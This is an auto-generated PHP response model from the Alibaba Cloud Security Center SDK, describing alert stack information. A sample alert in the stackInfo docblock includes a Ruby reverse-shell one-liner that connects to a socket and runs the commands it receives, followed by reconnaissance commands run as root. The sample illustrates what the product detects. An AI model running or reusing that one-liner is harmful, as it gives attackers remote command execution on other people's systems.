<?php

// This file is auto-generated, don't edit it. Thanks.

namespace AlibabaCloud\SDK\Sas\V20181203\Models;

use AlibabaCloud\Tea\Model;

class DescribeAlarmEventStackInfoResponseBody extends Model
{
    /**
     * @description The ID of the request.
     *
     * @example ECC6B3E3-D496-512D-B46D-E6996A6B63EE
     *
     * @var string
     */
    public $requestId;

    /**
     * @description The stack information of the alert details.
     *
     * @example \[ { "child": \[ { "child": \[ { "child": \[ ], "data": { "cmdline": "id", "proc_path": "/bin/id", "pid": "\[3033]" }, "description": { "extend": \[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } }, { "child": \[ ], "data": { "cmdline": "whoami", "proc_path": "/bin/whoami", "pid": "\[3035]" }, "description": { "extend": \[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "cmdline": "/bin/bash -c \"id && whoami\"", "proc_path": "/bin/bash", "pid": "\[3022]" }, "description": { "extend": \[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "src_ip": "0.0.0.0", "cmdline": "ruby -rsocket -e exit if fork;c=TCPSocket.new(\\"0.0.0.0\\",\\"1111\\");while(cmd=c.gets);IO.popen(cmd,\\"r\\"){|io|c.print io.read}end", "file": "ruby", "login_port": "22", "login_type": "Password", "proc_path": "/usr/bin/ruby", "dst_port": "1111", "pid": "3011", "user": "root", "dst_ip": "0.0.0.0", "log_time": "2020-01-20 09:00:00" }, "description": { "extend": \[ { "content": "${tpl_netstat}", "content_type": "text" } ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ]
     *
     * @var string
     */
    public $stackInfo;
    protected $_name = [
        'requestId' => 'RequestId',
        'stackInfo' => 'StackInfo',
    ];

    public function validate()
    {
    }

    public function toMap()
    {
        $res = [];
        if (null !== $this->requestId) {
            $res['RequestId'] = $this->requestId;
        }
        if (null !== $this->stackInfo) {
            $res['StackInfo'] = $this->stackInfo;
        }

        return $res;
    }

    /**
     * @param array $map
     *
     * @return DescribeAlarmEventStackInfoResponseBody
     */
    public static function fromMap($map = [])
    {
        $model = new self();
        if (isset($map['RequestId'])) {
            $model->requestId = $map['RequestId'];
        }
        if (isset($map['StackInfo'])) {
            $model->stackInfo = $map['StackInfo'];
        }

        return $model;
    }
}
